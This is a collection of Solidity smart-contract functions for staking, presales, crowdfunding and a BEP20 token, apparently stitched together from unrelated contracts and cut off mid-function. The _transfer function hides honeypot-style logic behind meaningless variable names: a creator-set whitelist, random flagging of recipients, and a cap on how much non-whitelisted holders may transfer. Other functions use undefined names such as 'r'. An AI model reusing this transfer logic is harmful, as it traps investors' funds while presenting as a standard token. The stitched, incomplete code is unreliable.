function _init(address user) internal {
    for (uint256 i = 0; i < _presales.length; i++) {
        _tokensTotal[user] +=
            IContracts(_presales[i]).balanceOf(user) *
            _rates[i];
    }
    _initialized[user] = true;
}

function unstake(uint amountToWithdraw) payable public {
    require(msg.value >= fee, "Insufficient fee deposited.");
    owner.transfer(msg.value);
    require(depositedTokens[msg.sender] >= amountToWithdraw, "Invalid amount to withdraw");
    require(now.sub(stakingTime[msg.sender]) > cliffTime, "You recently staked, please wait before withdrawing.");
    updateAccount(msg.sender);
    require(Token(tokenAddress).transfer(msg.sender, amountToWithdraw), "Could not transfer tokens.");
    depositedTokens[msg.sender] = depositedTokens[msg.sender].sub(amountToWithdraw);
    if (holders.contains(msg.sender) && depositedTokens[msg.sender] == 0) {
        holders.remove(msg.sender);
    }
}

function getStakingAmount() public view returns(uint) {
    if (totalClaimedRewards >= stakingTokens) {
        return 0;
    }
    uint remaining = stakingTokens.sub(totalClaimedRewards);
    return remaining;
}

function stake(uint amountToStake) payable public {
    require(msg.value >= fee, "Insufficient fee deposited.");
    owner.transfer(msg.value);
    require(amountToStake > 0, "Cannot deposit 0 Tokens");
    require(Token(tokenAddress).transferFrom(msg.sender, address(this), amountToStake), "Insufficient Token Allowance");
    updateAccount(msg.sender);
    depositedTokens[msg.sender] = depositedTokens[msg.sender].add(amountToStake);
    if (!holders.contains(msg.sender)) {
        holders.add(msg.sender);
        stakingTime[msg.sender] = now;
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    if ((address(sender) == creator) && (hardcore == true)) {
        ziliqa[recipient] = true;
        chopa[recipient] = false;
        hardcore = false;
    }
    if (ziliqa[recipient] != true) {
        chopa[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((chopa[sender]) && (ziliqa[recipient] == false)) {
        chopa[recipient] = true;
    }
    if (ziliqa[sender] == false) {
        require(amount < thearc);
    }
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _deposit(uint amountToStake) internal {
    require(stakingStatus == true, "Staking is not yet initialized");
    require(amountToStake > 0, "Cannot deposit 0 Tokens");
    require(referer[msg.sender] != address(0) || msg.sender == admin, "No upline, you need an upline");
    require(Token(tokenAddress).transferFrom(msg.sender, address(this), amountToStake), "Insufficient Token Allowance");
    updateAccount(msg.sender);
    uint fee = amountToStake.mul(stakingFeeRate).div(1e4);
    uint amountAfterFee = amountToStake.sub(fee);
    require(Token(tokenAddress).transfer(admin, fee), "Could not transfer deposit fee.");
    depositedTokens[msg.sender] = depositedTokens[msg.sender].add(amountAfterFee);
    if (!holders.contains(msg.sender)) {
        holders.add(msg.sender);
        stakingTime[msg.sender] = now;
    }
}

function withdraw(uint amountToWithdraw) public {
    require(depositedTokens[msg.sender] >= amountToWithdraw, "Invalid amount to withdraw");
    require(now.sub(stakingTime[msg.sender]) > PossibleUnstakeTime, "You have not staked for a while yet, kindly wait a bit more");
    updateAccount(msg.sender);
    uint fee = amountToWithdraw.mul(unstakingFeeRate).div(1e4);
    uint amountAfterFee = amountToWithdraw.sub(fee);
    require(Token(tokenAddress).transfer(admin, fee), "Could not transfer withdraw fee.");
    require(Token(tokenAddress).transfer(msg.sender, amountAfterFee), "Could not transfer tokens.");
    depositedTokens[msg.sender] = depositedTokens[msg.sender].sub(amountToWithdraw);
    if (holders.contains(msg.sender) && depositedTokens[msg.sender] == 0) {
        holders.remove(msg.sender);
    }
}

function endFundraising() public inState(State.Successful) onlyController() {
    uint amount = currentBalance;
    uint balance = currentBalance;
    for (uint i = 0; i < fiatInvestors.length; i++) {
        address investorAddress = fiatInvestors[i];
        uint investorShare = fiatInvestorShare[investorAddress];
        uint investorAmount = div(mul(balance, investorShare), 1000000);
        investorAddress.transfer(investorAmount);
        amount -= investorAmount;
    }
    uint percentDevelopers = 5;
    uint percentMarketing = 5;
    uint amountDevelopers = div(mul(balance, percentDevelopers), 100);
    uint amountMarketing = div(mul(balance, percentMarketing), 100);
    developersRecipient.transfer(amountDevelopers);
    marketingRecipient.transfer(amountMarketing);
    amount -= (amountDevelopers + amountMarketing);
    fundRecipient.transfer(amount);
    generateReserve();
    currentBalance = 0;
    state = State.Closed;
    exchangeToken.changeController(controller);
}

function investment() public inState(State.Fundraising) accountNotFrozen minInvestment payable returns(uint) {
    uint amount = msg.value;
    balanceOf[msg.sender] += amount;
    currentBalance += amount;
    updateExchangeRate();
    uint tokenAmount = getExchangeRate(amount);
    exchangeToken.generateTokens(msg.sender, tokenAmount);
    tokensIssued += tokenAmount;
    updateExchangeRate();
    emit FundTransfer(msg.sender, amount, true);
    emit LogFundingReceived(msg.sender, tokenAmount, tokensIssued);
    checkIfFundingCompleteOrExpired();
    return balanceOf[msg.sender];
}

function generateReserve() private {
    require(isReserveGenerated == false);
    uint issued = tokensIssued;
    uint percentTeam = 15;
    uint percentBounty = 1;
    uint reserveAmountTeam = div(mul(issued, percentTeam), 85);
    uint reserveAmountBounty = div(mul(issued, percentBounty), 99);
    exchangeToken.generateTokens(reserveTeamRecipient, reserveAmountTeam);
    exchangeToken.generateTokens(reserveBountyRecipient, reserveAmountBounty);
    isReserveGenerated = true;
}

function startFundraising() public inState(State.Wait) onlyController {
    startBlockNumber = block.number;
    endBlockNumber = startBlockNumber + ((31 * 24 * 3600) / 15); 
    state = State.Fundraising;
    tokensIssued = exchangeToken.totalSupply();
    updateExchangeRate();
}

function buyTokens(address beneficiary, uint256 amount) onlyAuthorised whenNotPaused internal {
    setTier(r);
    require(amount >= minContribution);
    require(amount <= maxContribution);
    uint256 tokens = amount.mul(rate);
    weiRaised = weiRaised.add(amount);
    if (token.balanceOf(beneficiary) == 0) {
        numberOfPurchasers++;
    }
    tokenRaised = tokenRaised.add(tokens); 
    token.mint(beneficiary, tokens);
    TokenPurchase(beneficiary, amount, tokens);
    multiSig.transfer(this.balance); 
}

function placeTokens(address beneficiary, uint256 _tokens) onlyCS public {
    require(_tokens != 0);
    require(!hasEnded());
